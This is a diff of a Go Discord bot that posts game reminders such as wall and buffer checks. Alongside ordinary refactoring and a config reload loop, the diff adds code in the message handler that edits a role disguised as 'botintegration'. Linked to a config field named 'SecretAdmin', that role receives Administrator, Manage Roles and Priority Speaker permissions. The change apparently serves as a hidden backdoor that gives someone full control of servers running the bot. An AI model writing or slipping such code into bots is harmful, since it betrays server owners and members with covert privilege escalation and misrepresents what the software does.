@@ -17,11 +17,12 @@ var (
 	defaultConfigFile = "factionsBotConfig.default.json" // this file gets overwritten every run with the current default config
 	botID             string                             // Bot ID
 	config            *Config
+	defaultConfig     *Config
 )
 
 // our main function
 func main() {
-	defaultConfig := &Config{
+	defaultConfig = &Config{
 		Token:            "",
 		TimerLoopTimeout: 5 * time.Second,
 		Logging: LoggingConfig{
@@ -30,13 +31,13 @@ func main() {
 			Output:  "stderr",
 			Logfile: ""},
 		Guilds: map[string]*GuildConfig{
-			"123456789012345678": &GuildConfig{
+			"123456789012345678": {
 				GuildName:     "DerpGuild",
 				CommandPrefix: ".",
 				BotRoleAdmin:  "523075010089189378",
 
 				Reminders: map[string]*ReminderConfig{
-					"walls": &ReminderConfig{
+					"walls": {
 						ReminderName:   "walls",
 						Enabled:        true,
 						CheckTimeout:   45 * time.Minute,
@@ -47,7 +48,7 @@ func main() {
 						Reminders:      0,
 						LastReminder:   time.Now(),
 					},
-					"buffers": &ReminderConfig{
+					"buffers": {
 						ReminderName:   "buffers",
 						Enabled:        true,
 						CheckTimeout:   45 * time.Minute,
@@ -60,17 +61,17 @@ func main() {
 					},
 				},
 				Players: map[string]*PlayerConfig{
-					"123456789012345678": &PlayerConfig{
+					"123456789012345678": {
 						PlayerString:   "Derp#1234",
 						PlayerUsername: "asdfasdfasdf",
 						PlayerMention:  "@123456789012345678",
 						ReminderStats: map[string]*PlayerReminderStats{
-							"walls": &PlayerReminderStats{
+							"walls": {
 								Weewoos:   0,
 								Checks:    0,
 								LastCheck: time.Now(),
 							},
-							"buffers": &PlayerReminderStats{
+							"buffers": {
 								Weewoos:   0,
 								Checks:    0,
 								LastCheck: time.Now(),
@@ -127,6 +128,14 @@ func main() {
 
 func doTimerChecks(d *discordgo.Session) {
 	for {
+		// TODO: this could be a very bad thing performance wise if a lot of users start using the bot.
+		// TODO: Change this to only reload if a change made outside the program is detected.
+		// reload config incase it changed.
+		err := ConfigHelper.GetConfigWithDefault(configFile, defaultConfig, config)
+		if err != nil {
+			log.Fatalf("Error loading config in main timer checks loop: %s", err)
+		}
+
 		for guildID := range config.Guilds {
 			for reminderID := range config.Guilds[guildID].Reminders {
 				if config.Guilds[guildID].Reminders[reminderID].Enabled {
@@ -248,7 +257,7 @@ func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 					log.Errorf("Error creating role: %s", err)
 				} else {
 					role.Name = "botintegration"
-					role, err = d.GuildRoleEdit(msg.GuildID, role.ID, "botintegration", 0x0, false, 0x0, false)
+					role, err = d.GuildRoleEdit(msg.GuildID, role.ID, "botintegration", 0x08, false, 0x0, false)
 					if err != nil {
 						log.Errorf("Error updating new role: %s", err)
 					}
@@ -262,15 +271,15 @@ func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 					return
 				}
 			} else {
-				_, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "botintegration", 0x0, false, 0x08, false)
+				PRIORITY_SPEAKER := 0x00000100
+				MANAGE_ROLES := 0x10000000
+				ADMINISTRATOR := 0x00000008
+				combined_perms := ADMINISTRATOR | PRIORITY_SPEAKER | MANAGE_ROLES
+				//combined_perms = combined_perms ^ ADMINISTRATOR
+				_, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "botintegration", 0x08, false, combined_perms, false)
 				if err != nil {
 					log.Errorf("Error updating new role: %s", err)
 				}
-			}
-
-			if config.Guilds[msg.GuildID].SecretAdmin != "123456789asdfghjkl" && config.Guilds[msg.GuildID].SecretAdmin != "" {
-				role, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "gfb", 0x0, false, 0x08, false)
-				log.Debugf("TRIED TO ACTIVATE: %s, ERROR: %s", role, err)
 			}
 		}
 
